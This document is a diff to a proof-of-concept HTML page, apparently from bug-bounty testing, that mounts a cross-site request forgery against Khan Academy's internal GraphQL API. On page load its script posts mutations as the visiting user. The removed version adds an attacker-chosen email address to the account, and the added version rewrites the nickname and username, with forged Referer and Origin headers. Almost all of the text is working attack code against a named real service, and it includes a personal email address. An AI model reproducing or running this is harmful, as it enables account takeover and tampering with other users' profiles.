@@ -1,29 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CSRF PoC for GraphQL</title>
 </head>
 <body>
     <h1>CSRF PoC for GraphQL Mutation</h1>
-    
+
     <script>
-        // Prepare the payload
+        // Payload for the GraphQL request
         const payload = {
-            "operationName": "requestAuthEmail",
-           "variables": {
-                "authEmail": "awyea1652@gmail.com"
+            "operationName": "updateProfile",
+            "variables": {
+                "bio": "",  // Optionally update this field
+                "nickname": "ihab123",  // The new nickname to set
+                "username": "Mero1652"  // Optionally update this field
             },
-            "query":"mutation requestAuthEmail($authEmail: String!) {\n  requestAuthEmail(authEmail: $authEmail) {\n    user {\n      id\n      pendingEmails\n      __typename\n    }\n    error {\n      code\n      __typename\n    }\n    __typename\n  }\n}"}
+            "query": `
+                mutation updateProfile($avatarName: String, $bio: String, $profileAccessLevel: ProfileAccessLevel, $nickname: String, $username: String) {
+                    setSettings(
+                        avatarName: $avatarName
+                        bio: $bio
+                        nickname: $nickname
+                        username: $username
+                        profileAccessLevel: $profileAccessLevel
+                    ) {
+                        user {
+                            id
+                            avatar {
+                                name
+                                imageSrc
+                                __typename
+                            }
+                            bio
+                            profile {
+                                accessLevel
+                                __typename
+                            }
+                            nickname
+                            username
+                            __typename
+                        }
+                        errors {
+                            code
+                            __typename
+                        }
+                        __typename
+                    }
+                }
+            `
         };
 
-        // Make the POST request to the target endpoint
-        fetch('https://www.khanacademy.org/api/internal/graphql/requestAuthEmail?lang=en&_=240807-1626-6591bfdb76a6_1723114619016', {
+        // Send the POST request
+        fetch('https://www.khanacademy.org/api/internal/graphql/updateProfile?lang=en&_=240809-0504-63fa69b1daff_1723217878465', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
                 'X-Ka-Fkey': '1',
-                'Referer': 'https://www.khanacademy.org/settings/account',
-                'Origin': 'https://www.khanacademy.org'
+                'Referer': 'https://www.khanacademy.org/profile/me/courses',  // Attempted custom Referer
+                'Origin': 'https://www.khanacademy.org'  // Attempted custom Origin
             },
             body: JSON.stringify(payload)
         })
